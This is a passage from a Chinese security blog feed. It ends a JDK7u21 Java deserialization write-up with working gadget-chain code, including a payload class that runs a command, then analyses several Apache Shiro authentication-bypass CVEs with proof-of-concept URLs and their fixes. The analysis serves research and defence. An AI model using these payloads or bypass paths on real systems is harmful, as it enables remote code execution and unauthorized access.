templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, "_bytecodes", new byte[][]&#123;</span></span><br><span class="line"><span class="comment">//                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, "_name", "HelloTemplatesImpl");</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());</span></span><br><span class="line"> </span><br><span class="line">        String zeroHashCodeStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">"foo"</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler类</span></span><br><span class="line">        Constructor handlerConstructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handlerConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 为tempHandler创造一层代理</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(App.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">        set.add(proxy);</span><br><span class="line">        set.add(templates);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            ObjectOutputStream obout = new ObjectOutputStream(new FileOutputStream("out.bin"));</span></span><br><span class="line"><span class="comment">//            obout.writeObject(set);</span></span><br><span class="line"><span class="comment">//            ObjectInputStream obin = new ObjectInputStream(new FileInputStream("out.bin"));</span></span><br><span class="line"><span class="comment">//            obin.readObject();</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"> </span><br><span class="line">        ByteArrayOutputStream baout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(baout);</span><br><span class="line">        obout.writeObject(set);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> BASE64Encoder().encode(baout.toByteArray()).replaceAll(<span class="string">"[\\s*\t\n\r]"</span>, <span class="string">""</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilTemplatesImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"Hello TemplatesImpl"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://mp.weixin.qq.com/s/qlg3IzyIc79GABSSUyt-OQ" target="_blank" rel="noopener">Java反序列化系列 ysoserial Jdk7u21</a></p></li><li><p><a href="https://github.com/phith0n/JavaThings/blob/master/general/src/main/java/com/govuln/deserialization/JDK7u21.java" target="_blank" rel="noopener">JDK7u21.java</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在ysoserial 的payloads目录下 有一个jdk7u21，以往的反序列化Gadget都是需要借助第三方库才可以成功执行，但是jdk7u21的Gadget执行过程中所用到的所有类都存在在JDK中&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;影响版本：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JDK &amp;lt;= 7u21&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;测试环境：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JDK 7u21&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pom.xml&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;javassist&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;javassist&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;3.12.0.GA&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;需要添加javassist依赖&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="反序列化" scheme="https://jlkl.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Shiro Vulnerability</title>
    <link href="https://jlkl.github.io/2021/06/28/Web_19/"/>
    <id>https://jlkl.github.io/2021/06/28/Web_19/</id>
    <published>2021-06-28T13:18:00.000Z</published>
    <updated>2021-06-28T13:25:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>基于此源码：<a href="https://github.com/l3yx/springboot-shiro" target="_blank" rel="noopener">https://github.com/l3yx/springboot-shiro</a></p><p>导入idea，application.properties添加</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.servlet.context-path</span>=/test</span><br></pre></td></tr></table></figure><p>因为pom.xml里排除了springboot内置的tomcat，新建Configurations-&gt;Tomcat Server，添加新的deployment，并设置context为<code>/test</code>，然后运行即可</p><p><img src="/2021/06/28/Web_19/20210521160542.png" alt="image-20210521160532545"></p><h3 id="Shiro基础"><a href="#Shiro基础" class="headerlink" title="Shiro基础"></a>Shiro基础</h3><p>Shiro验证</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">anon</span> <span class="string">不需要验证，可以直接访问</span></span><br><span class="line"><span class="attr">authc</span> <span class="string">需要验证，也就是我们需要bypass的地方</span></span><br></pre></td></tr></table></figure><p>Shiro的URL路径表达式为Ant格式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/hello 只匹配url http:/</span><span class="regexp">/demo.com/</span>hello</span><br><span class="line"><span class="regexp">/h?      只匹配url  http:/</span><span class="regexp">/demo.com/</span>h+任意一个字符</span><br><span class="line"><span class="regexp">/hello/</span>*  匹配url下 http:<span class="regexp">//</span>demo.com<span class="regexp">/hello/</span>xxxx的任意内容，不匹配多个路径</span><br><span class="line"><span class="regexp">/hello/</span>** 匹配url下 http:<span class="regexp">//</span>demo.com<span class="regexp">/hello/</span>xxxx<span class="regexp">/aaaa的任意内容，匹配多个路径</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h3><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>Apache Shiro &lt; 1.5.2</li></ul><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>这里需要在pom.xml里面修改shiro版本为1.5.1，而且spring-boot的版本记得改为:<code>1.5.22.RELEASE</code>，原因具体可以查看：</p><p><a href="https://www.anquanke.com/post/id/240033#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/240033#h3-5</a></p><p>同时因为版本问题，<code>SrpingbootShiroApplication.java</code> 里这个类名需要改成如下，然后启动tomcat即可<img src="/2021/06/28/Web_19/20210616102033.png" alt="image-20210616102024338"></p><p>POC：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/test/</span>a;<span class="regexp">/../</span>admin<span class="regexp">/page</span></span><br></pre></td></tr></table></figure><p>直接访问302</p><p><img src="/2021/06/28/Web_19/20210616103709.png" alt="image-20210616103708415"></p><p>绕过</p><p><img src="/2021/06/28/Web_19/20210616103733.png" alt="image-20210616103732111"></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这里需要前置知识<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">Tomcat URL解析差异性导致的安全问题</a>，总结就是</p><blockquote><p>Tomcat对请求路径中<code>/;xxx/</code>以及<code>/./</code>的处理是包容的、对<code>/../</code>会进行跨目录拼接处理</p></blockquote><p>调试tomcat逻辑需要在pom.xml里添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.37<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定位到1.5.2版本修改的文件 <code>org\apache\shiro\web\util\WebUtils.java</code>，里面getRequestUri函数调用的是request.getRequestURI处理，对于POC，此时uri和POC相同，即<code>/test/a;/../admin/page</code></p><p><img src="/2021/06/28/Web_19/20210616204020.png" alt="image-20210616204018948"></p><p>decodeAndCleanUriString函数则是对含有<code>;</code>的路径进行处理，直接忽略掉<code>;</code>和其之后的部分，对于POC，返回<code>/test/a</code></p><p><img src="/2021/06/28/Web_19/20210616204348.png" alt="image-20210616204343806"></p><p>normalize函数会对uri进行规范化处理，处理掉<code>/./</code>，<code>/../</code>，这里对POC没有什么影响</p><p>return完之后进入getPathWithinApplication函数，去除掉ContextPath，对于POC返回<code>/a</code></p><p><img src="/2021/06/28/Web_19/20210616204918.png" alt="image-20210616204917915"></p><p>然后进入Shiro匹配逻辑，取出config中定义规则，验证是否匹配，<code>/a</code>显然不满足<code>/admin/*</code>，不需要验证</p><p><img src="/2021/06/28/Web_19/20210616205118.png" alt="image-20210616205117358"></p><p>Shiro验证绕过之后来到了Spring-boot解析，这个版本会调用tomcat的<code>getServletPath</code>，对<code>/;xxx/</code>以及<code>/./</code>有包容性，POC对于tomcat来说就相当于是<code>/test/admin/page</code>，于是能正常访问</p><p>总结漏洞产生的原因，Shiro调用request的getRequestURI获取到请求的地址之后，使用自身编写的逻辑去处理判断，没有考虑到tomcat解析兼容的差异性</p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>diff 1.5.1 和 1.5.2 的代码，这里主要使用<code>request.getServletPath</code>来获取请求的路径，而其是tomcat内置，会考虑到对<code>/;xxx/</code>以及<code>/./</code>的包容性，那么对于POC，getServletPath返回<code>/admin/page</code>，自然通不过验证，即Shiro主动去兼容tomcat</p><p><img src="/2021/06/28/Web_19/20210616210233.png" alt="image-20210616210233039"></p><h3 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h3><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>Apache Shiro &lt; 1.5.3</li></ul><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>第一种方式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/;/</span>test<span class="regexp">/admin/</span>page</span><br></pre></td></tr></table></figure><p><img src="/2021/06/28/Web_19/20210617110217.png" alt="image-20210617110209365"></p><p>第二种方式：</p><p>为了复现第二种方式，需要添加一个controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/admin/&#123;name&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@PathVariable String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/admin/w%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>orld 或 /test/admin/w%<span class="number">252f</span>orld</span><br></pre></td></tr></table></figure><p><code>%25%32%66</code> 和 <code>%252f</code>为<code>/</code> 的二次url编码</p><p><img src="/2021/06/28/Web_19/20210617110602.png" alt="image-20210617110601327"></p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a></p><p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a></p><p>第一种绕过方式比较通用，这里以第一种进行分析。在上一个我们提到Shiro验证是再getChain函数，获取到请求路径后，和config中配置进行对比</p><p><img src="/2021/06/28/Web_19/20210617112248.png" alt="image-20210617112247406"></p><p>获取请求路径是在getPathWithinApplication函数，getPathWithinApplication作用也说过，去掉请求中的ContextPath</p><p><img src="/2021/06/28/Web_19/20210617112929.png" alt="image-20210617112928238"></p><p>关键就在于getRequestUri函数，normalize是规范化<code>/./</code>和<code>/../</code></p><p><img src="/2021/06/28/Web_19/20210617142807.png" alt="image-20210617142806155"></p><p>decodeAndCleanUriString先进行一次url解码，然后注意59是<code>;</code>的ascii码，这里遇到<code>;</code>的处理逻辑是，直接忽略<code>;</code>及以后，那么对于POC1，这里获取到的路径就是<code>/</code>，可以绕过Shiro验证</p><p><img src="/2021/06/28/Web_19/20210617143202.png" alt="image-20210617143200521"></p><p>第二种方式主要是解码和匹配的问题，decodeAndCleanUriString还会进行一次url解码，<code>%25%32%66</code>会还原成<code>/</code>，<code>/admin/w/orld</code>不满足<code>/admin/*</code>（注意<code>/admin/*</code>只匹配一个路径，不匹配多个），所以绕过</p><h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>getServletPath和getPathInfo使用request方法获取路径和信息，会处理掉<code>;</code>，<code>..</code>等，同时没有了二次解码</p><p><img src="/2021/06/28/Web_19/20210617170426.png" alt="image-20210617170425647"></p><p><img src="/2021/06/28/Web_19/20210617170506.png" alt="image-20210617170504979"></p><p>xq17师傅还提到如果getPathInfo可以引入<code>;</code>，那么也是可以继续绕过的，遗憾的是我在调试的时候一直没找到getServletPath在哪一段可以引入，希望知道的师傅可以指导一下</p><p>同时上个版本的修复又改回去了</p><p><img src="/2021/06/28/Web_19/20210617170837.png" alt="image-20210617170836320"></p><h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><h4 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>Apache Shiro &lt; 1.6.0</li></ul><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>Shiro 1.5.3版本</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/admin/%<span class="number">3</span>bStr3am</span><br></pre></td></tr></table></figure><p><img src="/2021/06/28/Web_19/20210617171414.png" alt="image-20210617171413141"></p><h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><img src="/2021/06/28/Web_19/20210622153748.png" alt="image-20210622153740414"></p><p>修复过后的getPathWithinApplication函数中getServletPath调用request.getServletPath，会进行url二次解码，POC解码为<code>/admin/%3bStr3am</code>，removeSemicolon会对<code>;</code>进行处理。POC变为<code>/admin/</code></p><p><img src="/2021/06/28/Web_19/20210622153912.png" alt="image-20210622153857408"></p><p>然后这段是对Shiro-682的修复，会去掉最后的<code>/</code>，显然<code>/admin</code>不满足Shiro匹配<code>/admin/*</code>，所以造成bypass</p><h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>在<code>shiro 1.6.0</code>版本中，针对<code>/*</code>这种<code>ant</code>风格的配置出现的问题，<code>shiro</code>在<code>org.apache.shiro.spring.web.ShiroFilterFactoryBean.java</code>中默认增加了<code>/**</code>的路径配置，以防止出现匹配不成功的情况。</p><p><img src="/2021/06/28/Web_19/20210622154356.png" alt="image-20210622154355823"></p><p>而默认的<code>/**</code>配置对应了一个新增的类<code>org.apache.shiro.web.filter.InvalidRequestFilter</code>进行过滤，匹配到非法字符就会直接报错，可以看到，过滤了<code>%3b</code></p><p><img src="/2021/06/28/Web_19/20210622154521.png" alt="image-20210622154520915"></p><h3 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h3><h4 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>Apache Shiro &lt; 1.7.0</li></ul><h4 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><img src="/2021/06/28/Web_19/20210622154936.png" alt="image-20210622154935289"></p><p>增加了对PathInfo的检验，修复过后，Shiro的URL校验是由ServletPath和PathInfo构成，之前CVE-2020-11989的时候提到过可以在PathInfo加入<code>;</code>或<code>../</code>绕过，Spring-boot默认PathInfo为空，但在其他情况可以，利用范围有限。</p><h3 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h3><h4 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>Apache Shiro &lt; 1.7.0</li></ul><h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span>        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span>    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span>         <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通杀版本</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/admin/%<span class="number">20</span></span><br></pre></td></tr></table></figure><p><img src="/2021/06/28/Web_19/20210622163002.png" alt="image-20210622163001248"></p><p>springboot高版本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/test/</span>admin<span class="regexp">/%2e    或    /</span>test<span class="regexp">/admin/</span>%<span class="number">2</span>e</span><br></pre></td></tr></table></figure><p><img src="/2021/06/28/Web_19/20210622163112.png" alt="image-20210622163112082"></p><h4 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>通杀版本的绕过，其原因和<code>%3b</code>差不多，都是Shiro规则匹配特殊字符缺陷的原因</p><p>而针对<code>/test/admin/%2e</code>，request.getServletPath处理后返回<code>/test/admin/</code>，同样因为Shiro-682原因，会去掉最后的<code>/</code>导致bypass</p><h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><img src="/2021/06/28/Web_19/20210622171227.png" alt="image-20210622171226555"></p><p>解决空格分离的问题</p><p><img src="/2021/06/28/Web_19/20210622171519.png" alt="image-20210622171518753"></p><p>Shiro-682的修复改成了if/else判断</p><h3 id="权限绕过总结"><a href="#权限绕过总结" class="headerlink" title="权限绕过总结"></a>权限绕过总结</h3><p>经过上文的分析，可以看到权限绕过基本就在于Shiro和Spring到tomcat解析URL差异性上，Shiro用自己的逻辑去判断请求的地址，但是忽略了tomcat解析包容性的问题。导致绕过Shiro判断，而Spring能够正常解析。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="CVE-2016-4437（Shiro-550）"><a href="#CVE-2016-4437（Shiro-550）" class="headerlink" title="CVE-2016-4437（Shiro-550）"></a>CVE-2016-4437（Shiro-550）</h3><h4 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>Apache Shiro &lt; 1.2.4</li></ul><h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" 